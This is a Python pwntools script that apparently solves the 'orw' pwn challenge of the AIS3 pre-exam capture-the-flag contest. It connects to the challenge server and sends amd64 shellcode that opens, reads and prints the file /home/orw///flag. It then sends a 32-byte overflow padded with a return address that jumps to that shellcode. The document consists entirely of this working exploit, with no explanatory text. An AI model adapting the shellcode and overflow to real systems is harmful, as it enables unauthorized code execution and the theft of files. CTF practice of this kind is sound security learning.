from pwn import *

conn = remote("pre-exam-pwn.ais3.org", "10001")

context.arch = 'amd64'

payload = asm("""
	mov rax, 0x2
	push 0x0
	mov rbx, 0x67616c662f2f2f77
	push rbx
	mov rbx, 0x726f2f656d6f682f
	push rbx
	mov rdi, rsp
	xor rsi, rsi
	xor rdx, rdx
	syscall

	mov rdi, rax
	mov rax, 0x0
	mov rsi, 0x006010A0
	add rsi, 0x100
	mov rdx, 0x40
	syscall

	mov rax, 0x1
	mov rdi, 0x1
	mov rsi, 0x006010A0
	add rsi, 0x100
	mov rdx, 0x40
	syscall
""")
# file = open('/home/orw///flag', 0, 0)
# read(file, shellcode-0x100, 40)
# write(stdout, shellcode-0x100, 40)

conn.recvuntil('>')

conn.sendline(payload)

conn.recvuntil(":)\n")

payload = b"A" * 32 + p64(0x6010A0)

conn.sendline(payload)

conn.interactive()